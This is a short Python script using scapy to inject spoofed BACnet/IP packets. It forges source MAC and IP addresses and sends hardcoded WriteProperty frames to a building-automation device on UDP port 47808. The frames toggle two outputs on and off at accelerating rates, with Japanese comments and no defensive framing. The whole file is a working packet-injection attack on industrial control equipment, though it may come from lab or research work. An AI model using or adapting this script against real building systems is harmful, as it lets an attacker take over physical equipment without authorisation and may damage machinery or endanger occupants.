#import re
from time import sleep
import binascii
import random, string
from scapy.all import *

#conf.verb = 0

M_MAC = '00:05:1b:a8:6d:d3'#自分のMACアドレス

PROTO_NUM = 17 #icmp:1 tcp:6 udp:17
TH1 = 71 #WriteProperty:71
SLEEP_TIME1 = 0.3
SLEEP_TIME2 = 0.1
SLEEP_TIME3 = 0.01

IF = "en8"
#FILTER = "ether src "+ T_MAC1 +" and not ether src "+ M_MAC

ON01 ='810a001901040004ba100c010012011e09552e91012f39081f'
ON02 ='810a001901040004bd100c010012001e09552e91012f39081f'
OF01 ='810a001901040004bc100c010012011e09552e91002f39081f'
OF02 ='810a001901040004be100c010012001e09552e91002f39081f'

on_01 = binascii.unhexlify(ON01)
on_02 = binascii.unhexlify(ON02)
of_01 = binascii.unhexlify(OF01)
of_02 = binascii.unhexlify(OF02)


eth = Ether()
eth.src = '74:3a:65:84:c7:82'
eth.dst = '00:c0:8f:82:a3:25'
eth.type = 0x0800

ip = IP()
ip.version =4
ip.ihl = 5
ip.id = 1
ip.flags = 0x0000
ip.ttl = 64
ip.proto = 'udp'
ip.src = '192.168.10.10'
ip.dst = '192.168.10.40'

udp = UDP()
udp.sport = 47808
udp.dport = 47808 # bacnet

for i in range(0,10):

    if i < 3 :
        ip.id += 2
        pkt = eth/ip/udp/on_01
        sendp(pkt,iface=IF)
        sleep(SLEEP_TIME1)
        ip.id += 2
        pkt = eth/ip/udp/on_02
        sendp(pkt,iface=IF)
        sleep(SLEEP_TIME1)
        ip.id += 2
        pkt = eth/ip/udp/of_01
        sendp(pkt,iface=IF)
        sleep(SLEEP_TIME1)
        ip.id += 2
        pkt = eth/ip/udp/of_02
        sendp(pkt,iface=IF)
        sleep(SLEEP_TIME1)
    elif 3 < i and i < 6 :
        ip.id += 2
        pkt = eth/ip/udp/on_01
        sendp(pkt,iface=IF)
        sleep(SLEEP_TIME2)
        ip.id += 2
        pkt = eth/ip/udp/on_02
        sendp(pkt,iface=IF)
        sleep(SLEEP_TIME2)
        ip.id += 2
        pkt = eth/ip/udp/of_01
        sendp(pkt,iface=IF)
        sleep(SLEEP_TIME2)
        ip.id += 2
        pkt = eth/ip/udp/of_02
        sendp(pkt,iface=IF)
        sleep(SLEEP_TIME2)
    elif 6 < i :
        ip.id += 2
        pkt = eth/ip/udp/on_01
        sendp(pkt,iface=IF)
        sleep(SLEEP_TIME3)
        ip.id += 2
        pkt = eth/ip/udp/on_02
        sendp(pkt,iface=IF)
        sleep(SLEEP_TIME3)
        ip.id += 2
        pkt = eth/ip/udp/of_01
        sendp(pkt,iface=IF)
        sleep(SLEEP_TIME3)
        ip.id += 2
        pkt = eth/ip/udp/of_02
        sendp(pkt,iface=IF)
        sleep(SLEEP_TIME3)



